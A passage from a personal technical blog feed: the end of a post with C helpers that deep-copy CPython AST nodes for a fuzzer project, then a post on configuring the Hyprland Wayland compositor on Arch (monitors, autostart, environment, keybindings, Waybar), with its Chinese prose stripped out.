class="line"><span class="meta">    &#123;                                                    \</span></span><br><span class="line"><span class="meta">        return val;                                      \</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line">TRIAL_COPY(boolop)</span><br><span class="line">TRIAL_COPY(operator)</span><br><span class="line">TRIAL_COPY(unaryop)</span><br><span class="line">TRIAL_COPY(cmpop)</span><br><span class="line">TRIAL_COPY(expr_context)</span><br><span class="line"></span><br><span class="line">identifier <span class="title function_">identifier_copy</span><span class="params">(identifier val, PyArena *arena)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> PyUnicode_Copy_Arena(val, arena);</span><br><span class="line">&#125;</span><br><span class="line">PyObject *<span class="title function_">string_copy</span><span class="params">(PyObject *val, PyArena *arena)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> PyUnicode_Copy_Arena(val, arena);</span><br><span class="line">&#125;</span><br><span class="line">PyObject *<span class="title function_">constant_copy</span><span class="params">(PyObject *val, PyArena *arena)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (PyLong_CheckExact(val))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> PyLong_Copy_Arena(val, arena);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (PyUnicode_CheckExact(val))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> PyUnicode_Copy_Arena(val, arena);</span><br><span class="line">    &#125;</span><br><span class="line">    ERROR(<span class="string">&quot;Unknown constant type, use fallback - %s\n&quot;</span>, val-&gt;ob_type-&gt;tp_name);</span><br><span class="line">    _PyArena_AddPyObject(arena, val);</span><br><span class="line">    Py_INCREF(val);</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ASDL_SEQ_COPY_COMBINED(type) \</span></span><br><span class="line"><span class="meta">    ASDL_SEQ_COPY_ADD_FRONT(type)    \</span></span><br><span class="line"><span class="meta">    ASDL_SEQ_COPY_ADD(type)          \</span></span><br><span class="line"><span class="meta">    ASDL_SEQ_COPY(type)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ASDL_SEQ_COPY_ADD(type)                                                                           \</span></span><br><span class="line"><span class="meta">    asdl_##type##_seq *asdl_##type##_seq##_copy_add(asdl_##type##_seq *seq, PyArena *arena, int add_size) \</span></span><br><span class="line"><span class="meta">    &#123;                                                                                                     \</span></span><br><span class="line"><span class="meta">        asdl_##type##_seq *re;                                                                            \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (seq == NULL)                                                                                  \</span></span><br><span class="line"><span class="meta">        &#123;                                                                                                 \</span></span><br><span class="line"><span class="meta">            re = _Py_##asdl_##type##_seq##_new(add_size, arena);                                          \</span></span><br><span class="line"><span class="meta">        &#125;                                                                                                 \</span></span><br><span class="line"><span class="meta">        <span class="keyword">else</span>                                                                                              \</span></span><br><span class="line"><span class="meta">        &#123;                                                                                                 \</span></span><br><span class="line"><span class="meta">            re = _Py_##asdl_##type##_seq##_new(seq-&gt;size + add_size, arena);                              \</span></span><br><span class="line"><span class="meta">            for (int i = 0; i <span class="string">&lt; seq-&gt;</span>size; i++)                                                           \</span></span><br><span class="line"><span class="meta">            &#123;                                                                                             \</span></span><br><span class="line"><span class="meta">                re-&gt;typed_elements[i] = type##_copy(seq-&gt;typed_elements[i], arena);                       \</span></span><br><span class="line"><span class="meta">            &#125;                                                                                             \</span></span><br><span class="line"><span class="meta">        &#125;                                                                                                 \</span></span><br><span class="line"><span class="meta">        return re;                                                                                        \</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ASDL_SEQ_COPY_ADD_FRONT(type)                                                                           \</span></span><br><span class="line"><span class="meta">    asdl_##type##_seq *asdl_##type##_seq##_copy_add_front(asdl_##type##_seq *seq, PyArena *arena, int add_size) \</span></span><br><span class="line"><span class="meta">    &#123;                                                                                                           \</span></span><br><span class="line"><span class="meta">        asdl_##type##_seq *re;                                                                                  \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (seq == NULL)                                                                                        \</span></span><br><span class="line"><span class="meta">        &#123;                                                                                                       \</span></span><br><span class="line"><span class="meta">            re = _Py_##asdl_##type##_seq##_new(add_size, arena);                                                \</span></span><br><span class="line"><span class="meta">        &#125;                                                                                                       \</span></span><br><span class="line"><span class="meta">        <span class="keyword">else</span>                                                                                                    \</span></span><br><span class="line"><span class="meta">        &#123;                                                                                                       \</span></span><br><span class="line"><span class="meta">            re = _Py_##asdl_##type##_seq##_new(seq-&gt;size + add_size, arena);                                    \</span></span><br><span class="line"><span class="meta">            for (int i = 1; i <span class="string">&lt; seq-&gt;</span>size + 1; i++)                                                             \</span></span><br><span class="line"><span class="meta">            &#123;                                                                                                   \</span></span><br><span class="line"><span class="meta">                re-&gt;typed_elements[i] = type##_copy(seq-&gt;typed_elements[i - 1], arena);                         \</span></span><br><span class="line"><span class="meta">            &#125;                                                                                                   \</span></span><br><span class="line"><span class="meta">        &#125;                                                                                                       \</span></span><br><span class="line"><span class="meta">        return re;                                                                                              \</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ASDL_SEQ_COPY(type)                                                             \</span></span><br><span class="line"><span class="meta">    asdl_##type##_seq *asdl_##type##_seq##_copy(asdl_##type##_seq *seq, PyArena *arena) \</span></span><br><span class="line"><span class="meta">    &#123;                                                                                   \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (seq == NULL)                                                                \</span></span><br><span class="line"><span class="meta">        &#123;                                                                               \</span></span><br><span class="line"><span class="meta">            return NULL;                                                                \</span></span><br><span class="line"><span class="meta">        &#125;                                                                               \</span></span><br><span class="line"><span class="meta">        asdl_##type##_seq *re = _Py_##asdl_##type##_seq##_new(seq-&gt;size, arena);        \</span></span><br><span class="line"><span class="meta">        for (int i = 0; i <span class="string">&lt; seq-&gt;</span>size; i++)                                             \</span></span><br><span class="line"><span class="meta">        &#123;                                                                               \</span></span><br><span class="line"><span class="meta">            re-&gt;typed_elements[i] = type##_copy(seq-&gt;typed_elements[i], arena);         \</span></span><br><span class="line"><span class="meta">        &#125;                                                                               \</span></span><br><span class="line"><span class="meta">        return re;                                                                      \</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"></span><br><span class="line">ASDL_SEQ_COPY_COMBINED(expr)</span><br><span class="line">ASDL_SEQ_COPY_COMBINED(stmt)</span><br><span class="line">ASDL_SEQ_COPY_COMBINED(keyword)</span><br><span class="line">asdl_int_seq *<span class="title function_">asdl_int_seq_copy</span><span class="params">(asdl_int_seq *seq, PyArena *arena)</span></span><br><span class="line">&#123;</span><br><span class="line">    asdl_int_seq *re = _Py_asdl_int_seq_new(seq-&gt;size, arena);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; seq-&gt;size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        re-&gt;typed_elements[i] = seq-&gt;typed_elements[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">asdl_int_seq *<span class="title function_">asdl_int_seq_copy_add</span><span class="params">(asdl_int_seq *seq, PyArena *arena, <span class="type">int</span> add_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    asdl_int_seq *re = _Py_asdl_int_seq_new(seq-&gt;size + add_size, arena);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; seq-&gt;size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        re-&gt;typed_elements[i] = seq-&gt;typed_elements[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">ASDL_SEQ_COPY_COMBINED(arg)</span><br><span class="line">ASDL_SEQ_COPY_COMBINED(comprehension)</span><br><span class="line">ASDL_SEQ_COPY_COMBINED(type_param)</span><br><span class="line">ASDL_SEQ_COPY_COMBINED(alias)</span><br><span class="line">ASDL_SEQ_COPY_COMBINED(excepthandler)</span><br><span class="line">ASDL_SEQ_COPY_COMBINED(type_ignore)</span><br><span class="line">ASDL_SEQ_COPY_COMBINED(withitem)</span><br><span class="line">ASDL_SEQ_COPY_COMBINED(match_case)</span><br><span class="line">ASDL_SEQ_COPY_COMBINED(identifier)</span><br><span class="line">ASDL_SEQ_COPY_COMBINED(pattern)</span><br></pre></td></tr></table></figure><h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h2><p>Run the script with <code>pycore_ast.h</code> as first argument, and the destination filename (w&#x2F;o extension) as second argument.<br>E.g:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python deepcopy_ast.py $(<span class="built_in">readlink</span> -f <span class="variable">$CPYTHON_BIN_PATH</span>/include/python3.*/internal/pycore_ast.h) <span class="variable">$SRC_PATH</span>/codgen/deepcopy_gen</span><br></pre></td></tr></table></figure><p>Then add all above files into your project: <code>deepcopy_gen.c</code> and <code>deepcopy.c</code>.<br><em>Check <a href="https://github.com/sefcom/CPython-AST-Fuzzer">CPython-AST-Fuzzer</a></em></p>]]></content>
      
      
      <categories>
          
          <category> HelperCodes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CPython </tag>
            
            <tag> Python AST structure </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arch KDE -&gt; Hyprland</title>
      <link href="/2024/04/28/arch-hyprland/"/>
      <url>/2024/04/28/arch-hyprland/</url>
      
        <content type="html"><![CDATA[<blockquote><p>KDE  Wayland  crash,  Hyprland </p></blockquote><h2 id="1-"><a href="#1-" class="headerlink" title="1. "></a>1. </h2><ol start="0"><li> Arch KDE() </li><li>pacman <a href="https://archlinux.org/packages/extra/x86_64/hyprwayland-scanner">hyprwayland-scanner</a>  yay <a href="https://aur.archlinux.org/packages/hyprwayland-scanner-git">hyprwayland-scanner-git</a></li><li>pacman <a href="https://archlinux.org/packages/extra/x86_64/hyprland/">hyprland</a>  yay <a href="https://aur.archlinux.org/packages/hyprwayland-git">hyprwayland-git</a></li><li>[Optional]  console  <code>hyprland</code> , , cmd  hyprland  Super </li></ol><h2 id="2-"><a href="#2-" class="headerlink" title="2. "></a>2. </h2><ol start="0"><li> sddm  hyprland,  Arch KDE()</li><li> <code>~/.config/hypr/hyprland.conf</code>,  <a href="https://github.com/hyprwm/Hyprland/blob/main/example/hyprland.conf">hyprwm&#x2F;Hyprland</a>, </li><li> <code>Super</code> key , <code>terminal</code> ( <code>kitty</code>) ( konsole)</li><li></li></ol><h3 id="2-1-MONITORS"><a href="#2-1-MONITORS" class="headerlink" title="2.1 MONITORS"></a>2.1 MONITORS</h3><p>,  AOC ,   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">################</span><br><span class="line">### MONITORS ###</span><br><span class="line">################</span><br><span class="line"></span><br><span class="line"># See https://wiki.hyprland.org/Configuring/Monitors/</span><br><span class="line">monitor=,preferred,auto,1</span><br><span class="line"># auto put AOC in left</span><br><span class="line">monitor=desc:Chimei Innolux Corporation 0x15E8,1920x1080@60,1920x0,1</span><br><span class="line">monitor=desc:AOC 27B2 0x0000CD6A,1920x1080@75,0x0,1</span><br></pre></td></tr></table></figure><p> <code>monitor</code>  description  <code>hyprctl monitors</code> .  position (), ,  <code>hyprshot</code>.</p><h3 id="2-2-MY-PROGRAMS"><a href="#2-2-MY-PROGRAMS" class="headerlink" title="2.2  MY PROGRAMS"></a>2.2  MY PROGRAMS</h3><p> <code>terminal</code> </p><h3 id="2-3-Autostart"><a href="#2-3-Autostart" class="headerlink" title="2.3 Autostart"></a>2.3 Autostart</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#################</span><br><span class="line">### AUTOSTART ###</span><br><span class="line">#################</span><br><span class="line"></span><br><span class="line"># Autostart necessary processes (like notifications daemons, status bars, etc.)</span><br><span class="line"># Or execute your favorite apps at launch like this:</span><br><span class="line"></span><br><span class="line">exec-once=dbus-update-activation-environment --systemd WAYLAND_DISPLAY XDG_CURRENT_DESKTOP # for screen sharing</span><br><span class="line"># exec-once = ~/xdg-deksop-portal-hyprland-startup.sh</span><br><span class="line">exec-once = $terminal</span><br><span class="line"># notification</span><br><span class="line">exec-once = dunst</span><br><span class="line"># status bar and background</span><br><span class="line">exec-once = waybar -c ~/.config/waybar/waybar.conf</span><br><span class="line"># wallpaper</span><br><span class="line">exec-once = hyprpaper --config ~/.config/hypr/hyprpaper.conf</span><br><span class="line"># copy-paste manager</span><br><span class="line">exec-once = wl-paste --type text --watch cliphist store #Stores only text data</span><br><span class="line">exec-once = wl-paste --type image --watch cliphist store #Stores only image data</span><br><span class="line"># save paste content after application closed</span><br><span class="line">exec-once = wl-clip-persist --clipboard regular</span><br><span class="line"></span><br><span class="line"># KDE auth kit - auth popup</span><br><span class="line"># exec-once=/usr/lib/polkit-kde-authentication-agent-1</span><br><span class="line"># Or if you use Hyprland w/o uwsm</span><br><span class="line"># check https://wiki.hyprland.org/Hypr-Ecosystem/hyprpolkitagent/</span><br><span class="line"># exec-once = systemctl --user start hyprpolkitagent</span><br><span class="line"># fcitx5 config</span><br><span class="line">exec-once=fcitx5-remote -r</span><br><span class="line">exec-once=fcitx5 -d --replace</span><br><span class="line">exec-once=fcitx5-remote -r</span><br><span class="line"># icon indicator on waybar</span><br><span class="line">exec-once=nm-applet --indicator</span><br><span class="line">exec-once=blueman-applet</span><br></pre></td></tr></table></figure><ul><li><code>wl-clipboard</code> <code>wl-clip-ersist</code> <code>waybar</code> <code>hyprpolkitagent</code> ,  <code>pacman</code>  yay</li><li><code>wl-paste</code> ,  <code>Super + V</code> </li><li><code>fcitx</code>  <a href="https://github.com/hyprwm/Hyprland/discussions/421">hyprwm&#x2F;Hyprland&#x2F;discussions&#x2F;421</a></li></ul><h3 id="2-4-INPUT"><a href="#2-4-INPUT" class="headerlink" title="2.4 INPUT"></a>2.4 INPUT</h3><ul><li><code>kb_options</code>  compose key  <code>kb_options = compose:ralt</code></li><li><code>follow_mouse</code> ,  <code>1=hover</code>()  <code>2=click</code>()</li><li><code>scroll_factor</code> </li></ul><h3 id="2-5-ENV"><a href="#2-5-ENV" class="headerlink" title="2.5 ENV"></a>2.5 ENV</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#############################</span><br><span class="line">### ENVIRONMENT VARIABLES ###</span><br><span class="line">#############################</span><br><span class="line"></span><br><span class="line"># See https://wiki.hyprland.org/Configuring/Environment-variables/</span><br><span class="line"></span><br><span class="line"># fcitx</span><br><span class="line"># env = GTK_IM_MODULE,fcitx # set GTK seperately for fcitx instead of setting GTK_IM_MODULE</span><br><span class="line">env = QT_IM_MODULE,fcitx</span><br><span class="line">env = QT_IM_MODULES,wayland;fcitx;ibus</span><br><span class="line">env = XMODIFIERS,@im=fcitx</span><br><span class="line">env = SDL_IM_MODULE,fcitx</span><br><span class="line">env = GLFW_IM_MODULE,ibus</span><br><span class="line"></span><br><span class="line">env = GDK_BACKEND,wayland,x11,*</span><br><span class="line">env = ELECTRON_OZONE_PLATFORM_HINT,wayland</span><br><span class="line">env = QT_QPA_PLATFORM,wayland;xcb</span><br><span class="line">env = SDL_VIDEODRIVER,wayland</span><br><span class="line">env = CLUTTER_BACKEND,wayland</span><br><span class="line"></span><br><span class="line">env = XCURSOR_SIZE,24</span><br><span class="line">env = HYPRCURSOR_SIZE,24</span><br><span class="line">env = XDG_MENU_PREFIX,arch-</span><br><span class="line">env = XDG_CURRENT_DESKTOP,Hyprland</span><br><span class="line">env = XDG_SESSION_TYPE,wayland</span><br><span class="line">env = XDG_SESSION_DESKTOP,Hyprland</span><br></pre></td></tr></table></figure><h3 id="2-6-KEYBINDINGSS"><a href="#2-6-KEYBINDINGSS" class="headerlink" title="2.6 KEYBINDINGSS"></a>2.6 KEYBINDINGSS</h3><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">####################</span><br><span class="line">### KEYBINDINGSS ###</span><br><span class="line">####################</span><br><span class="line"></span><br><span class="line"># See https://wiki.hyprland.org/Configuring/Keywords/</span><br><span class="line">$mainMod = SUPER # Sets &quot;Windows&quot; key as main modifier</span><br><span class="line"></span><br><span class="line"># Example binds, see https://wiki.hyprland.org/Configuring/Binds/ for more</span><br><span class="line">bind = $mainMod, Q, exec, $terminal</span><br><span class="line">bind = $mainMod, C, killactive,</span><br><span class="line">bind = $mainMod, M, exit,</span><br><span class="line">bind = $mainMod, E, exec, $fileManager</span><br><span class="line">bind = $mainMod, F, togglefloating,</span><br><span class="line">bind = $mainMod, R, exec, $menu</span><br><span class="line"># bind = $mainMod, P, pseudo, # dwindle</span><br><span class="line">bind = $mainMod, P, exec, $terminal -e &quot; python&quot;</span><br><span class="line">bind = $mainMod, J, togglesplit, # dwindle</span><br><span class="line"></span><br><span class="line"># Move focus with mainMod + arrow keys</span><br><span class="line">bind = $mainMod, left, movefocus, l</span><br><span class="line">bind = $mainMod, right, movefocus, r</span><br><span class="line">bind = $mainMod, up, movefocus, u</span><br><span class="line">bind = $mainMod, down, movefocus, d</span><br><span class="line"># bind = $mainMod, down, layoutmsg, cyclenext</span><br><span class="line"></span><br><span class="line"># Switch workspaces with mainMod + [0-9]</span><br><span class="line">bind = $mainMod, 1, workspace, 1</span><br><span class="line">bind = $mainMod, 2, workspace, 2</span><br><span class="line">bind = $mainMod, 3, workspace, 3</span><br><span class="line">bind = $mainMod, 4, workspace, 4</span><br><span class="line">bind = $mainMod, 5, workspace, 5</span><br><span class="line">bind = $mainMod, 6, workspace, 6</span><br><span class="line">bind = $mainMod, 7, workspace, 7</span><br><span class="line">bind = $mainMod, 8, workspace, 8</span><br><span class="line">bind = $mainMod, 9, workspace, 9</span><br><span class="line">bind = $mainMod, 0, workspace, 10</span><br><span class="line"></span><br><span class="line"># Move active window to a workspace with mainMod + SHIFT + [0-9]</span><br><span class="line">bind = $mainMod SHIFT, 1, movetoworkspace, 1</span><br><span class="line">bind = $mainMod SHIFT, 2, movetoworkspace, 2</span><br><span class="line">bind = $mainMod SHIFT, 3, movetoworkspace, 3</span><br><span class="line">bind = $mainMod SHIFT, 4, movetoworkspace, 4</span><br><span class="line">bind = $mainMod SHIFT, 5, movetoworkspace, 5</span><br><span class="line">bind = $mainMod SHIFT, 6, movetoworkspace, 6</span><br><span class="line">bind = $mainMod SHIFT, 7, movetoworkspace, 7</span><br><span class="line">bind = $mainMod SHIFT, 8, movetoworkspace, 8</span><br><span class="line">bind = $mainMod SHIFT, 9, movetoworkspace, 9</span><br><span class="line">bind = $mainMod SHIFT, 0, movetoworkspace, 10</span><br><span class="line"></span><br><span class="line"># Example special workspace (scratchpad)</span><br><span class="line">bind = $mainMod, S, togglespecialworkspace, magic</span><br><span class="line">bind = $mainMod SHIFT, S, movetoworkspace, special:magic</span><br><span class="line"></span><br><span class="line">bind = $mainMod, V, exec, cliphist list | wofi --dmenu | cliphist decode | wl-copy</span><br><span class="line">bind = $mainMod, G, exec, google-chrome-stable --enable-features=UseOzonePlatform --ozone-platform=wayland --enable-wayland-ime</span><br><span class="line">bind = $mainMode, K, exec, kate</span><br><span class="line">bind = $mainMode, Y, exec, spotify --enable-features=UseOzonePlatform --ozone-platform=wayland --enable-wayland-ime</span><br><span class="line"></span><br><span class="line"># Scroll through existing workspaces with mainMod + scroll</span><br><span class="line">bind = $mainMod, mouse_down, workspace, e+1</span><br><span class="line">bind = $mainMod, mouse_up, workspace, e-1</span><br><span class="line"></span><br><span class="line"># Move/resize windows with mainMod + LMB/RMB and dragging</span><br><span class="line">bindm = $mainMod, mouse:272, movewindow</span><br><span class="line">bindm = $mainMod, mouse:273, resizewindow</span><br><span class="line"></span><br><span class="line"># bind=,Print,exec,hyprshot -m region --clipboard-only</span><br><span class="line"># bind=,Print, exec, grimblast copy area</span><br><span class="line">bind=,Print, exec,grim -g &quot;$(slurp)&quot; - | swappy -f -</span><br><span class="line"># bindel=, XF86AudioRaiseVolume, exec, wpctl set-volume @DEFAULT_AUDIO_SINK@ 5%+</span><br><span class="line"># bindel=, XF86AudioLowerVolume, exec, wpctl set-volume @DEFAULT_AUDIO_SINK@ 5%-</span><br><span class="line">bind=, XF86AudioMute, exec, wpctl set-mute @DEFAULT_AUDIO_SINK@ toggle</span><br><span class="line">bind =, XF86AudioPlay, exec, playerctl play-pause</span><br><span class="line">bind =, XF86AudioPause, exec, playerctl play-pause</span><br><span class="line">bind =, XF86AudioNext, exec, playerctl next</span><br><span class="line">bind =, XF86AudioPrev, exec, playerctl previous</span><br><span class="line">bind = , XF86AudioRaiseVolume, exec, volumectl up</span><br><span class="line">bind = , XF86AudioLowerVolume, exec, volumectl down</span><br><span class="line"># use acpi in /etc/acpi/handlers and /etc/acpi/events</span><br><span class="line"># bind = , XF86MonBrightnessUp, exec, lightctl up</span><br><span class="line"># bind = , XF86MonBrightnessDown, exec, lightctl down</span><br><span class="line">bind = $mainMod, L, exec, hyprlock</span><br></pre></td></tr></table></figure><ul><li><code>bind</code> <code>bindl</code> <code>bindm</code> </li><li><code>hyprshot</code> <code>grimblast</code> <code>playerctl</code> <code>hyprlock</code>, <code>swappy</code> </li><li>Arch  <code>lightctl</code>  <code>acpi</code> ,  <a href="https://ejmastnak.com/tutorials/arch/backlight/">ejmastnak.com&#x2F;tutorials&#x2F;arch&#x2F;backlight</a></li></ul><h3 id="2-7-Waybar-Status-Bar"><a href="#2-7-Waybar-Status-Bar" class="headerlink" title="2.7 Waybar - Status Bar"></a>2.7 Waybar - Status Bar</h3><ol start="0"><li> <code>~/.config/waybar/waybar.conf</code></li><li> <a href="https://github.com/Alexays/Waybar/wiki/Examples">Alexays&#x2F;Waybar&#x2F;wiki&#x2F;Examples</a> , , </li></ol><p><code>waybar.json</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// -*- mode: json -*-</span></span><br><span class="line"><span class="comment">// from https://github.com/cjbassi/config/blob/master/.config/waybar/config</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;layer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;top&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;position&quot;</span><span class="punctuation">:</span> <span class="string">&quot;top&quot;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">&quot;modules-left&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">  <span class="string">&quot;hyprland/workspaces&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/right-arrow-dark&quot;</span></span><br><span class="line"> <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;modules-center&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">  <span class="string">&quot;custom/left-arrow-dark&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;clock#1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;custom/left-arrow-light&quot;</span><span class="punctuation">,</span></span><br><span 